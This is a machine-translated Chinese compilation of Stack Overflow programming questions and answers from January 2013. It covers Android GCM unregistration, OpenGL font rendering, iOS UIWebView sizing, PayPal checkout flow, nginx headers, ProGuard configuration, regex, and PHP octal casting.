> 时间：2013-01-01T14:04:32.423
> 
> 标签：android, android-intent, android-c2dm, google-cloud-messaging

我已经在我的 android 应用程序中成功实现了推送通知的框架。但是我对Google`GCM`在 Class 中覆盖的函数有点困惑。`GcmIntentService`

```
@Override
protected void onUnregistered(Context context, String registrationId) {

//Do whatever you want 
```

}

何时调用此方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T14:38:26.207

来自官方 java 文档：

> 要从 GCM 注销，请执行以下操作：

```
Intent unregIntent = new
Intent("com.google.android.c2dm.intent.UNREGISTER");
 unregIntent.putExtra("app", PendingIntent.getBroadcast(this, 0, new
 Intent(), 0)); 
 startService(unregIntent); 
```

> 与注册请求类似，此意图是异步发送的，响应以 com.google.android.c2dm.intent.REGISTRATION 意图的形式出现。

一种用例可能是调用服务器上的 Web 服务，以便它可以从其注册设备列表中删除该设备。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-03T10:56:47.617

要从 GCM 注销 android 设备，请在代码中您要注销的位置添加此行

```
GCMRegistrar.unregister(this); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T14:36:01.493

[在您使用GCMRegistrar.unregister() 方法](http://developer.android.com/reference/com/google/android/gcm/GCMRegistrar.html#unregister%28android.content.Context%29)从 GCM 服务器取消注册后，将调用它。

如[GCMBaseIntentService](http://developer.android.com/reference/com/google/android/gcm/GCMBaseIntentService.html#onUnregistered%28android.content.Context,%20java.lang.String%29)文档中所述：

> 在设备取消注册后调用。

您还应该查看[取消注册的工作原理](http://developer.android.com/google/gcm/adv.html#unreg)文档，因为它描述了设备将被取消注册的两种方式：手动和自动。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-01T14:40:06.440

```
onUnregistered(Context context, String regId): 
```

### 在设备从 GCM 注销后调用。通常，您应该将 regid 发送到服务器，以便它取消注册设备。

发现您可以在应用程序即将被卸载之前取消注册。不知道，但希望这是唯一的方法

### 在应用程序即将被卸载之前调用 Activity，使用以下 Intent-filters 添加 Activity::

```
 <activity
    android:name=".UninstallIntentActivity"
    android:label="@string/app_name" >

    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <action android:name="android.intent.action.DELETE" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="package" android:pathPattern="com.testpack.yourapp" />
    </intent-filter>

</activity> 
```

在该活动中，您可以调用您的 ::

```
 onUnregistered(Context context, String regId): 
```

取消注册该设备。希望必须有一些更好的方法来解决这些问题。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-01-04T14:56:31.497

我从 Android 开发者网站本身得到了我期望的解决方案，实际上当应用程序被卸载时，该函数应该自动调用，根据谷歌在开发者网站上的描述但是，这个过程不会立即发生，因为 Android 不提供卸载回调。请检查下面提到的链接：

[http://developer.android.com/google/gcm/adv.html#unreg](http://developer.android.com/google/gcm/adv.html#unreg)

感谢大家的支持。

# c++ - 调整大小后丑陋的字体，OpenGL

> ID：14111135
> 
> 赞同：5
> 
> 时间：2013-01-01T14:04:52.887
> 
> 标签：c++, opengl, fonts, ftgl

我将从一张图片开始：

![在此处输入图像描述](../Images/635983031519e4c2835cde30966ea380.png)

上图展示了以两种不同方式实现的文本，都使用相同类型的字体 - Arial、粗体、11 号。

底部的那个是在图像编辑程序中创建的，而顶部的那个是在我的 OpenGL 应用程序中创建的。更准确地说，使用`FTExtrudeFont`FTGL 库：

```
font_ptr font(new FTExtrudeFont(filename.c_str())); 
```

我的问题是，为什么画成这样？我认为造成这种情况的原因可能是不同的大小调整算法，但如果是这样，我怎样才能在我的 OpenGL 应用程序中实现这种更好看的字体（底部字体）？

编辑：

要渲染字体，我只调用这个函数：

```
font->Render(text,         // Text to be displayed
             -1,           // Line length, which by default is left as -1
             pos);         // Position in which to draw text 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T14:12:56.867

这看起来像是由 OpenGL 中的纹理采样引起的。当您绘制的纹理（在这种情况下为字体）与您绘制它的四边形大小不同时，就会发生这种情况。

简单的解决方案：确保纹理大小与屏幕上绘制的区域相匹配。不要将 14px 字体渲染到 12px 区域，而是使用 12px 字体或 14px 区域。

在您的问题中，您提到您的字体是“11 号”。我不知道 FTGL 库的详细信息，但我假设有一个调用会告诉您可以绘制的特定字符串的最佳尺寸。不要使用您自己的数学来计算这些，使用库。只要尺寸正确，就不会发生您遇到的问题。

# c++ - 如何将模板参数中的函数或成员函数指针转换为函数类？

> ID：14111138
> 
> 赞同：0
> 
> 时间：2013-01-01T14:05:12.910
> 
> 标签：c++, templates

如何将模板参数中的函数或成员函数指针转换为函数类？假设函数类是定义成员函数的类`operator()`。

我认为概括模板中函数和成员函数的使用很有用。

例如，

```
template<..., class FunClass>
class MyClass {}; 
```

然后，FunClass 可以根据 MyClass 的要求，由各种函数指针、不同参数个数的成员函数指针转换而来。有什么简单的转换方法吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:42:55.410

按照评论中的讨论：您可以`ConvertToFunClass`这样提取：（从[这里](https://stackoverflow.com/a/8932845/276994)窃取）

```
template<typename Sig>
struct Types;

template<typename RetType, typename ClassType, typename Arg0>
struct Types<RetType (ClassType::*)(Arg0)>
{
    typedef RetType return_type;
    typedef ClassType class_type;
    typedef Arg0 argument_0;
}; 
```

用法可能是`MyClass<T, R, Types<decltype(&MyFun)>::ClassType > a;`.

（免责声明：我没有尝试代码，无法访问编译器 ATM。）

# iphone - UIWebView Inside UIScrollView 内容大小

> ID：14111139
> 
> 赞同：8
> 
> 时间：2013-01-01T14:05:16.770
> 
> 标签：iphone, ios, xcode, uiwebview, uiscrollview

我必须在`UIWebView`里面添加一些按钮和标签`UIScrollView`。我已经看到很多关于如何在`UIWebView`里面添加的问题，`UIScrollView`但不幸的是他们无法帮助我完成我的任务。所以请不要将其标记为重复或其他内容。

理论上，这个问题可以通过以下步骤解决：

1）制作`UIWebView`一个子视图`UIScrollView`。

2) 要求`setScrollEnabled:NO`禁用`UIWebView`其本机滚动。

3) 将两者的内容大小设置为`UIScrollView`内部`UIWebView`加载的 HTML 字符串的大小`UIWebview`。

我正在使用 iOS 6 和 StoryBoards。我已添加`UIWebView`为`UIScrollView`.

然后在我的 中`webViewDidFinishLoad`，我使用了以下内容：

```
 NSString *webHeight = [webView stringByEvaluatingJavaScriptFromString:@"document.height;"];
 NSLog(@"WebView Height %@", webHeight); 
```

这给了我 WebView 的高度。

在 StackOverFlow 上，我遇到了以下情况。

```
 CGRect frame = webView.frame;
    frame.size.height = 1;
    webView.frame = frame;
    CGSize fittingSize = [webView sizeThatFits:CGSizeZero];
    frame.size = fittingSize;
    webView.frame = frame;

    NSLog(@"size: %f, %f", fittingSize.width, fittingSize.height); 
```

然后我将大小设置为`UISCrollView`大小`UIWebView`：

```
mainScrollView.contentSize = webView.bounds.size; 
```

我可以向下滚动到底部，但底部有一个空白区域，并且`UIWebView`没有根据加载的 html 内容的大小调整其大小。

![在此处输入图像描述](../Images/098e6ec47bc013a94e5811de22327253.png)

看起来`UIScrollView`已将其大小更改为内容的大小，`UIWebView`但`UIWebView`并未显示所有内容。我该如何解决这个问题？

请不要建议我有关 Apple 文档中说您不应该`UIWebView`在内部使用的信息`UIScrollView`。我已经知道了，但我想根据我的项目要求使用它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-05-29T08:11:18.870

我发现 webView 不反映帧大小变化的情况相同，正如杰西卡提到的那样，向下滚动时会留下空白。我检查了我的项目，发现我已经启用了 autoLayout 功能，所以我找到的解决方案是：

1.  禁用自动布局。
2.  在更改 webView 框架大小后，向 webView 添加高度约束，使用如下代码：

    self.webViewHeightConstraint.constant =fittingSize.height; [webView 更新约束];

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-17T06:50:12.870

我想我可以在这里阐明一些观点。我认为您混淆了框架大小和内容大小。首先我将描述方法，然后提出具体建议。

**方法**

你有一个 webView 并且你正确地禁用了它的滚动并将 contentSize 设置为 web 内容的完整大小。您还应该将框架大小设置为 Web 内容的完整大小。然后你 addSubview 这个到原点 (0,0) 的滚动视图。将 scrollView contentSize 设置为 Web 内容的完整大小。将 scrollView 框架设置为 viewController.view 的边界。

**具体建议**

*   您发布的“fittingSize”代码对我来说看起来不正确。该代码的目的是设置 webView 的框架。使用 NSLog 或断点来确定这是否设置了 Web 内容的完整大小。
*   请注意，您发布的 javascript 代码的用途与您发布的“fittingSize”代码相同。检查哪个产生正确的输出。
*   尝试弄清楚 webView 和 scrollView 的帧大小以帮助您调试。最好的方法是设置不同的背景颜色，如下所示：`setBackgroundColor:[UIColor redColor]`
*   我最好的猜测是`webView.frame.size`设置的不够大。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-01-14T14:12:51.797

为了获得 UIWebView**内容**的高度，我强烈推荐这里的“现象”答案：[http](https://stackoverflow.com/questions/3936041/how-to-determine-the-content-size-of-a-uiwebview) : //stackoverflow.com（不是公认的答案，下面的答案。）他/她建议不要使用“CGSizeZero”，并给出一个更好的解决方案。

# php - PHP mySQL 和 Paypal 结帐程序

> ID：14111140
> 
> 赞同：2
> 
> 时间：2013-01-01T14:05:36.973
> 
> 标签：php, mysql, paypal, shopping-cart

我写了一个结帐表格。我填写了表单数据，现在是时候将数据用于结帐了。我可以将数据插入到 mySQL 等...

我在在线结帐程序方面没有太多经验。我的问题是填写表格后下一步是什么步骤或程序？

我知道客户将被发送到 PayPal。那么我应该继续将数据作为未付费或其他方式输入到 mySQL 中，然后将它们发送到 PayPal 吗？然后，一旦交易完成，交易数据会被发送回表单，然后它会更新 mySQL 数据并将客户发送到收据？

我希望建立一个标准的结帐。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T17:21:02.947

我们可以定义一个标准的电子商务结帐，如下所示（假设您使用的是贝宝）：

1.  将商品添加到购物车
2.  结帐（在您的网站中。不是实际的贝宝结帐）
3.  收集客户信息（登录/注册+帐单地址）
4.  将订单保存到数据库并收集新的 order_id。
5.  将 order_id 作为“paypal express checkout request”的一部分发送
6.  用户将从贝宝重定向到您的网站。使用从 paypal 返回的 order_id 更新数据库中的订单状态。

还要检查这个贝宝快递结帐示例代码： [https ://github.com/hrendoh/PayPal-Express-Checkout-example](https://github.com/hrendoh/PayPal-Express-Checkout-example)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-02T05:23:37.643

我建议在将用户发送到 PayPal 之前计算有关订单的所有内容并将其保存在您的数据库中。通过这种方式，您可以在 PayPal 付款信息中包含您的订单 ID，以便您可以轻松地在 PayPal 和您自己的系统之间交叉引用交易。

如果您想让事情尽可能简单，您可以使用[PayPal Payments Standard](https://cms.paypal.com/cms_content/US/en_US/files/developer/PP_WebsitePaymentsStandard_IntegrationGuide.pdf)。[如果您打算使用购物车上传方法](https://cms.paypal.com/mx/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_html_cart_upload)，我会推荐它。

如果您更喜欢 Web 服务 API，我会推荐[Express Checkout](https://www.x.com/developers/paypal/development-and-integration-guides#ec)。这将使您能够更自由地自定义结帐体验以满足您的需求。

[无论哪种方式，我都建议使用即时付款通知 (IPN)](https://www.x.com/developers/paypal/documentation-tools/ipn/integration-guide/IPNIntro)处理付款后处理。这将允许您实时更新您的数据库、点击第 3 方网络服务、发送定制的电子邮件收据等。它还允许您正确处理需要清算的待处理付款，例如电子支票，在这种情况下，您将获得 1 个用于待处理付款的 IPN，并在该付款实际清算时获得另一个 IPN。这样，您可以确保仅在付款完成后才处理订单。

# complexity-theory - 复杂性 - 如何计算

> ID：14111142
> 
> 赞同：0
> 
> 时间：2013-01-01T14:06:07.310
> 
> 标签：complexity-theory

我知道有些人之前可能会问过这个问题，但我会尝试的。

假设我有一个数组，我用冒泡排序排序

然后（在我完成排序之后）我再次排序（通过不同的比较）以便

达到我的目的。

我第一次使用： O(n ² ) 。

在我第二次使用： O(n ² ) 。

^(== > 我以 O(n 2) )的复杂度实现了我的目的。

或其他一些东西（O(n ³ ) 或 2*O(n ² ) 或者我不知道是什么）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T14:11:09.190

O(n ² ) + O(n ² ) = O(n ² ) 在理论上

**第一次：**

> f [1] (n) = O(n ² )

**第二次：**

> g [1] (n) = O(n ² )

**和：**

> f [1] (n) + g [1] (n) ⊆ O(n ² + n ² )
> f [1] (n) + g [1] (n) ⊆ O(2n ² ) ⊆ O(n ² )

**以下属性可能很有用：**

![无花果](../Images/a58c52a9a9c27e384e0f711509b080b5.png)

另外，使用第一条规则：

> O(n ² ) + O(n ² ) ⊆ O(n ² )

# node.js - 在 nginx 后面使用 expressjs 设置响应标头

> ID：14111147
> 
> 赞同：1
> 
> 时间：2013-01-01T14:06:30.510
> 
> 标签：node.js, nginx, express, locomotivejs

我们有一个使用 node js（express js）构建的 web 应用程序，它位于 nginx 后面。

对于特定的 API，我们希望内容类型响应标头为“text/plain”。对于此以下代码在控制器中。

res.setHeader('Content-Type', 'text/plain'); res.send（响应）；

当服务器不在 nginx 之后时，这有效。但是当服务器在 nginx 后面时，响应头仍然是 'application/json'

我的 nginx 配置如下所述：

```
#kZyguser www-data;
user root;
worker_processes 4;
pid /var/run/nginx.pid;

events {
        worker_connections 20000;
        # multi_accept on;
}

http {

        ##
        # Basic Settings
        ##

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ##
        # Logging Settings
        ##
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        ##
        # Gzip Settings
        ##

        gzip on;
        gzip_disable "msie6";

        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;

         gzip_types text/plain text/css application/x-javascript text/xml application/xml application/xml+rss text/javascript;

        client_max_body_size '10M';
 ##
        # nginx-naxsi config
        ##
        # Uncomment it if you installed nginx-naxsi
        ##

        #include /etc/nginx/naxsi_core.rules;

        ##
        # nginx-passenger config
        ##
        # Uncomment it if you installed nginx-passenger
        ##

        #passenger_root /usr;
        #passenger_ruby /usr/bin/ruby;

        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;

       server{
             location / {
              proxy_pass_header text-plain; 
                        }
             }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T20:18:50.887

你试过在 nginx 中使用 proxy_pass_header 吗？

`proxy_pass_header Content-Type;`

[http://wiki.nginx.org/HttpProxyModule](http://wiki.nginx.org/HttpProxyModule)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-04T05:30:39.723

Nginx 配置没问题。但是您仍然无法解决此问题，因为 nginx 根据您从控制器的响应定义了 MIME 类型，因此，请在发送响应之前序列化您的 json 数据。例子。

```
res.setHeader('Content-Type', 'text/plain'); res.send(response);
res.send(JSON.stringify(result)); 
```

现在，您的响应标头将显示为“文本/纯文本”。它对我有用。

# php - 使用 DOMDocument 获取多个元素

> ID：14111149
> 
> 赞同：0
> 
> 时间：2013-01-01T14:06:46.453
> 
> 标签：php, xpath, domdocument

我需要像这样解析html：

```
<div class="item"><div class="title">title 1</div><div class="date">day 1</div></div>
<div class="item"><div class="title">title 2</div><div class="date">day 2</div></div>
<div class="item"><div class="title">title 3</div><div class="date">day 3</div></div> 
```

其实我做这样的事情：

```
$title = $xpath->query('//div[@class="title"]//text()');
foreach ($title as $title)
{
  $title = trim($title->nodeValue);
}

$date = $xpath->query('//div[@class="date"]//text()');
foreach ($date as $date)
{
  $date = trim($date->nodeValue);
} 
```

但是有了这个我只拿一件物品，所以我正在寻找正确的方法来同时获得所有物品。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T14:09:10.543

您可能想要遍历`item`元素，然后找到它们各自`title`的`date`文本。

```
$items = $xpath->query('//div[@class="item"]');
foreach ($items as $item) {
    $title = $xpath->evaluate('string(div[@class="title"])', $item);
    $date  = $xpath->evaluate('string(div[@class="date"])', $item);
    echo "$title $date\n";
} 
```

[» 参见上面的在线运行示例](http://codepad.viper-7.com/0BZDjY)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T14:24:59.737

我真的不明白你的问题。循环按预期工作，例如，您可以将所有标题和日期累积在一个数组中。虽然我不会再重用相同的变量名。

```
$titles = $xpath->query('//div[@class="title"]//text()');
foreach ($titles as $title)
{
    $all_titles[] = trim($title->nodeValue);
}

$dates = $xpath->query('//div[@class="date"]//text()');
foreach ($dates as $date)
{
    $all_dates[] = trim($date->nodeValue);
} 
```

用于测试的[键盘。](http://codepad.org/2YqsDEZy)

# android - 启用 Proguard 后“应用程序停止工作”

> ID：14111150
> 
> 赞同：13
> 
> 时间：2013-01-01T14:06:47.263
> 
> 标签：android, proguard

在模拟器和我正在测试的设备上，它都是一个有效的应用程序。

但是现在，我启用了**Proguard**并使用`Android-Tools > Export signed application`

然后我将它复制`.apk`到 SD 卡上并尝试安装在设备上。但是应用程序停止工作，如果我尝试打开它，要求强制关闭。

如果我从 Eclipse 运行，它可以在设备上运行。

*因为，它说：*

Proguard 仅在您导出发行版 .apk 文件时才有效。我检查了一下，bin文件夹中的**apk**文件大小是**1.8mb**，而我导出后得到的1是**1.4mb**。似乎 Proguard 已经完成了它的工作。但该应用程序无法正常工作。可悲的是我看不到任何日志等..，

**编辑：**

如果我禁用 Proguard 然后导出，则发布 apk 文件现在可以正常工作。那么，Proguard 有问题吗？

我的文件夹结构

![在此处输入图像描述](../Images/2eba1b4ea0c765149c626fd2ec185d19.png)

**proguard-project.txt**

```
# This is a configuration file for ProGuard.
# http://proguard.sourceforge.net/index.html#manual/usage.html

-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-verbose

# Optimization is turned off by default. Dex does not like code run
# through the ProGuard optimize and preverify steps (and performs some
# of these optimizations on its own).
-dontoptimize
-dontpreverify
# Note that if you want to enable optimization, you cannot just
# include optimization flags in your own project configuration file;
# instead you will need to point to the
# "proguard-android-optimize.txt" file instead of this one from your
# project.properties file.

-keepattributes *Annotation*
-keep public class com.google.vending.licensing.ILicensingService
-keep public class com.android.vending.licensing.ILicensingService
-keep public class * extends android.app.Application
-keep public class * extends android.app.Activity
-keep public class * extends android.app.PreferenceActivity
-keep public class * extends android.view.View
-keep public class * extends android.widget.BaseAdapter
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * implements android.view.View.OnTouchListener
-keep public class * implements android.view.View.OnClickListener
-keep public class * extends com.actionbarsherlock.app.SherlockActivity
-keep public class * extends com.actionbarsherlock.app.SherlockFragmentActivity
-keep public class * extends com.actionbarsherlock.app.SherlockMapActivity
-keep public class * extends com.readystatesoftware.mapviewballoons.BalloonItemizedOverlay<OverlayItem>
-keep public class * extends com.actionbarsherlock.app.SherlockFragment

-libraryjars libs/android-support-v4.jar
-libraryjars libs/apache-mime4j-0.6.jar
-libraryjars libs/httpmime-4.0.1.jar
-libraryjars libs/libGoogleAnalyticsV2.jar  

-assumenosideeffects class android.util.Log {
    public static *** v(...);
    public static *** i(...);
    public static *** d(...);
    public static *** w(...);
    public static *** e(...);
}

# For native methods, see http://proguard.sourceforge.net/manual/examples.html#native
-keepclasseswithmembernames class * {
    native <methods>;
}

# keep setters in Views so that animations can still work.
# see http://proguard.sourceforge.net/manual/examples.html#beans
-keepclassmembers public class * extends android.view.View {
   void set*(***);
   *** get*();
}

# We want to keep methods in Activity that could be used in the XML attribute onClick
-keepclassmembers class * extends android.app.Activity {
   public void *(android.view.View);
}

# For enumeration classes, see http://proguard.sourceforge.net/manual/examples.html#enumerations
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

-keep class * implements android.os.Parcelable {
  public static final android.os.Parcelable$Creator *;
}

-keepclassmembers class **.R$* {
    public static <fields>;
}

# The support library contains references to newer platform versions.
# Don't warn about those in case this app is linking against an older
# platform version.  We know about them, and they are safe.
-dontwarn android.support.**
-dontwarn org.apache.** 
```

我今天才开始使用它，我不确定我是否以正确的方式使用它。所以，如果我在任何地方错了，请纠正我。

**这是 LogCat 错误：**

```
01-02 13:18:54.711: E/AndroidRuntime(585): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.xApp.app/com.xApp.app.LandingActivity}: java.lang.RuntimeException: java.lang.NoSuchMethodException: a(Activity,int)
01-02 13:18:54.711: E/AndroidRuntime(585):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1647)
01-02 13:18:54.711: E/AndroidRuntime(585):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1663)
01-02 13:18:54.711: E/AndroidRuntime(585):  at android.app.ActivityThread.access$1500(ActivityThread.java:117)
01-02 13:18:54.711: E/AndroidRuntime(585):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:931)
01-02 13:18:54.711: E/AndroidRuntime(585):  at android.os.Handler.dispatchMessage(Handler.java:99)
01-02 13:18:54.711: E/AndroidRuntime(585):  at android.os.Looper.loop(Looper.java:130)
01-02 13:18:54.711: E/AndroidRuntime(585):  at android.app.ActivityThread.main(ActivityThread.java:3683)
01-02 13:18:54.711: E/AndroidRuntime(585):  at java.lang.reflect.Method.invokeNative(Native Method)
01-02 13:18:54.711: E/AndroidRuntime(585):  at java.lang.reflect.Method.invoke(Method.java:507)
01-02 13:18:54.711: E/AndroidRuntime(585):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
01-02 13:18:54.711: E/AndroidRuntime(585):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
01-02 13:18:54.711: E/AndroidRuntime(585):  at dalvik.system.NativeStart.main(Native Method)
01-02 13:18:54.711: E/AndroidRuntime(585): Caused by: java.lang.RuntimeException: java.lang.NoSuchMethodException: a(Activity,int)
01-02 13:18:54.711: E/AndroidRuntime(585):  at com.actionbarsherlock.a.a(Unknown Source)
01-02 13:18:54.711: E/AndroidRuntime(585):  at com.actionbarsherlock.app.SherlockActivity.a(Unknown Source)
01-02 13:18:54.711: E/AndroidRuntime(585):  at com.actionbarsherlock.app.SherlockActivity.setContentView(Unknown Source)
01-02 13:18:54.711: E/AndroidRuntime(585):  at com.xApp.app.LandingActivity.onCreate(Unknown Source)
01-02 13:18:54.711: E/AndroidRuntime(585):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
01-02 13:18:54.711: E/AndroidRuntime(585):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1611)
01-02 13:18:54.711: E/AndroidRuntime(585):  ... 11 more
01-02 13:18:54.711: E/AndroidRuntime(585): Caused by: java.lang.NoSuchMethodException: a(Activity,int)
01-02 13:18:54.711: E/AndroidRuntime(585):  at java.lang.Class.getMatchingConstructor(Class.java:643)
01-02 13:18:54.711: E/AndroidRuntime(585):  at java.lang.Class.getConstructor(Class.java:472)
01-02 13:18:54.711: E/AndroidRuntime(585):  ... 17 more 
```

谢谢你

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2013-03-23T22:09:45.080

堆栈跟踪显示 ActionBarSherlock 无法使用反射找到构造函数“a(Activity,int)”。它的文档确实指定了 ActionBarSherlock 的每个扩展都应该有这样的构造函数。ProGuard 不（不能）知道这一点并删除了构造函数，因为它在代码中似乎未使用。因此，您必须明确告诉 ProGuard 保留它：

```
-keepclassmembers class * extends com.actionbarsherlock.ActionBarSherlock {
    <init>(android.app.Activity, int);
} 
```

一般来说，如果您在代码或其库中获得与反射相关的堆栈跟踪，则需要添加相应的配置。

# html - 关闭所有 HTML 标签（不仅是 IMG）

> ID：14111154
> 
> 赞同：1
> 
> 时间：2013-01-01T14:07:16.097
> 
> 标签：html, regex

我看到了[这个](https://stackoverflow.com/questions/2433809/close-all-html-unclosed-img-tags/2434110)关于关闭 img 标签的问题和答案。

但是，如果我还想关闭其他标签（如链接）怎么办？

我试着写

```
(<img|link[^>]+)(?<!/)> 
```

但这行不通

怎么了？

例子：

```
<link href="myhref">
<img src="mysrc"> 
```

但不是

```
<link href="myhref"/>
<img src="mysrc"/> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T14:33:09.703

您需要限制交替的范围。否则，`<`只有在交替的左边部分匹配时`[^>]+`才会匹配，并且只有在右边部分匹配时才会匹配。

```
(<(?:img|link)[^>]+)(?<!/)> 
```

应该解决这个问题。`(?:...)`是非捕获组，即仅用于分组，不用于捕获。替换操作 (with `\1/>`) 保持不变。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T14:35:31.250

KissXML 应该能够解析它......
它以 xml 模式包装 libxml2 但回退到 html 模式！

*   当你通过 options:NSXMLDocumentTidyHTML 它也会调用 CTidy

* * *

它工作得很好：D 真的（正如我一直说的那样；））

```
- (void)processNode:(DDXMLNode*)node {
if(node.kind==DDXMLElementKind) {
    NSLog(@"%@", node.name);
    for (id child in node.children) {
        [self processNode:child];
    }
}
}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
id sample = @"<link href=\"myhref\"><img src=\"mysrc\">";
id data = [sample dataUsingEncoding:NSUTF8StringEncoding];
DDXMLDocument *doc = [[DDXMLDocument alloc] initWithData:data options:DDXMLDocumentTidyHTML error:nil];
[self processNode:doc.rootElement];
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T14:14:43.360

您需要使用 HTML 解析器或基于 libxml2 的解析器。**在 Objective-c 中[](https://github.com/topfunky/hpple)***有一个名为**[*hpple*](https://github.com/topfunky/hpple)**的 libxml2 包装器。*hpple*可以毫无问题地解析凌乱的 HTML。*

# php - PHP int 类型转换生成错误值

> ID：14111159
> 
> 赞同：2
> 
> 时间：2013-01-01T14:08:02.477
> 
> 标签：php, type-conversion

我想将整数值存储在数据库中，并为此在 $_POST 值上使用 (int) 类型转换。但它评估另一个值而不是提交的整数。

```
echo (int)0444444; 
```

输出

```
149796 
```

请帮忙。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-01T14:10:23.933

给一个整数加上前缀`0`意味着它应该被解释为一个**八进制**值，即以 8 为底而不是以 10 为底。

```
0444444 (OCT) = 149796 (DEC) 
```

如果要将字符串转换为整数，而不是强制转换，您可以使用[`intval()`](http://php.net/manual/en/function.intval.php)which 可选地允许您指定基数 10。

虽然您的示例中的强制转换是从 int 到 int 的强制转换（0444444 已经被解释为整数），所以您的强制转换是无操作的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-01T14:12:13.120

根据其他答案，`0`前缀导致 PHP 将值解释为八进制。

该[`intval`](http://php.net/manual/en/function.intval.php)功能可能是您正在寻找的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-01T14:09:35.727

带前导`0`的值被视为八进制值。

# java - 使用移动数据时的 Http 客户端

> ID：14111162
> 
> 赞同：0
> 
> 时间：2013-01-01T14:08:31.540
> 
> 标签：java, android

我正在尝试向 servlet 发出 get 请求，但在使用移动数据连接时不断出现超时异常

> java.net.SocketException：操作超时

使用手机移动数据连接时，我可以在浏览器上上网，所以它不是我的数据包，并且代码在 wifi 连接上工作没问题。

我尝试将超时设置为 1000000 毫秒，但仍然出现异常，有人可以帮助我吗？

这是我正在使用的代码

```
 HttpParams httpParameters = new BasicHttpParams();
            HttpConnectionParams.setConnectionTimeout(httpParameters, 1000000 );
            HttpConnectionParams.setSoTimeout(httpParameters, 1000000 );
            HttpConnectionParams.setTcpNoDelay(httpParameters, true);
            HttpClient httpclient = new DefaultHttpClient(httpParameters);
            HttpResponse response = null;
            Log.d(TAG, "" + id[0]);

            response = httpclient.execute(new HttpGet(
                    "http://192.168.1.10:8080/serv/request?id=" + id[0]));
            Log.d(TAG, response.toString());
            Log.d(TAG, "status" + response.getStatusLine()); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:33:26.010

从您的 URI ( `http://192.168.1.10:8080/serv/request?id=`) 看来，您正在尝试访问本地 LAN 中的服务器。因此，如果您的服务器位于本地 LAN 中并且无法从 Internet 访问，那么您将无法使用移动数据连接连接到它...

您的服务器托管在哪里？您的服务器可以在互联网上访问吗？您需要在服务器上有一个静态 IP 才能使用移动数据连接访问服务器。

# android - 在eclipse中添加twitter和facebook

> ID：14111168
> 
> 赞同：-4
> 
> 时间：2013-01-01T14:10:10.277
> 
> 标签：android, facebook, eclipse, twitter

如何在我们的 Eclipse 项目中添加 twitter 和 facebook。我正在做一个视频流应用程序。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T14:58:10.610

*   Facebook：您可以[直接使用 Facebook API](http://developers.facebook.com/android/)，因为它非常容易理解并且效果很好。
*   Twitter：我建议你使用[这个 Twitter 库](http://twitter4j.org/en/index.html)，比它的 API 更好。

# c# - 在c#中获取最近选择的ListViewItem

> ID：14111174
> 
> 赞同：0
> 
> 时间：2013-01-01T14:10:48.483
> 
> 标签：c#, windows-store-apps

我在 Windows 应用程序中工作，在该应用程序上我有一个多选 ListView。我正在处理 selection_changed 事件以获取最近选择的项目。我选择第一项，然后选择第二项和第三项。但是在 listview 的 selectedItem 属性中，我仍然得到了第 2 个和第 3 个元素应该分别出现的第一个元素。我怎样才能做到这一点？这是我的代码。

```
 private void CategoryListview_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {        
            OfferCategory selectedCategory = (OfferCategory)CategoryListView.SelectedItem;
      } 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-01-01T14:26:34.837

我认为那是

```
ListView.SelectedIndices 
```

